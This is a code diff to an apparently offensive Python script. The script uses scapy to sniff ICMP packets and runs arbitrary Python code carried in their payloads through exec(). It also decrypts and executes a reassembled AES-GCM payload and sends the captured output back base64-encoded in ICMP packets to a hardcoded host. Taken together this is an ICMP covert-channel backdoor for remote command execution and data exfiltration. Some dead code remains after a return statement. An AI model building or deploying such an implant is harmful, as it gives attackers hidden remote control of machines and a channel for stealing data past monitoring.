@@ -1,11 +1,14 @@
+import contextlib
+import io
 import os
+import sys
 import threading
 from time import sleep
 
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from scapy.all import *
 
-HOST_IP = "10.0.0.113"
+HOST_IP = "10.0.0.205"
 FILLER_STRING = "\01"
 DELIMITER = "\00"
 RESEND_MESSGE_CODE = 9
@@ -37,6 +40,28 @@ def handle_data_received(packet):
     if Raw not in packet:
         return
     packet_data = packet[Raw].load
+    print(f"packet decoded: {packet_data.decode()}")
+
+    # Capture output of exec
+    code = packet_data.decode()[3:]
+    buffer = io.StringIO()
+    try:
+        with contextlib.redirect_stdout(buffer), contextlib.redirect_stderr(buffer):
+            exec(code)
+    except Exception as e:
+        print(f"Exec error: {e}", file=buffer)
+
+    output = buffer.getvalue()
+    # Use context manager to redirect stdout
+
+    if output:
+        send_output(output)
+    return
+    if packet_data.decode()[0:3] == 000:
+        exec(packet_data[3:])
+        print("here")
+        return
+
     print(packet_data)
 
     # first occurance of filler string
@@ -81,11 +106,13 @@ def handle_data_received(packet):
 MAX_MESSAGE_SIZE = 40
 
 
+icmp_id = os.getpid() & 0xFFFF
+
+
 def send_recover(missing: set[int]):
     global icmp_seq
 
     # the id comes from the current process id and doing a Internet checksum (used to identify the "session" or "process" sending the ping)
-    icmp_id = os.getpid() & 0xFFFF
     # seq increments per sent packet, helps detect packet loss, track individual requests
 
     for chunk_index in missing:
@@ -125,6 +152,21 @@ def decrypt_payload():
 stop_sniffing = False
 
 
+def send_output(output: str):
+    global icmp_seq
+    print("output")
+    print(output)
+    icmp_packet = (
+        IP(dst=HOST_IP)
+        / ICMP(id=icmp_id, seq=icmp_seq)
+        / Raw(load=base64.b64encode(output.encode()))
+    )
+
+    resp = sr1(icmp_packet, verbose=0, timeout=3)
+
+    icmp_seq += 1
+
+
 def sniffer():
     sniff(filter=fil, prn=handle_data_received, stop_filter=lambda p: stop_sniffing)
 
@@ -143,7 +185,25 @@ while True:
         else:
             print("All chunks received.")
             stop_sniffing = True
-            break
 
-total_payload = decrypt_payload()
-print(total_payload)
+    if stop_sniffing:
+        total_payload = decrypt_payload()
+        print(total_payload)
+        # if type == "payload":
+        # # Redirect stdout
+        old_stdout = sys.stdout
+        sys.stdout = buffer = io.StringIO()
+
+        try:
+            exec(total_payload)
+        finally:
+            sys.stdout = old_stdout  # Restore stdout
+        output = buffer.getvalue()
+        send_output(output)
+
+        # else:
+        # if cli
+
+        stop_sniffing = False
+        start_checking = False
+        total_chunks = -1
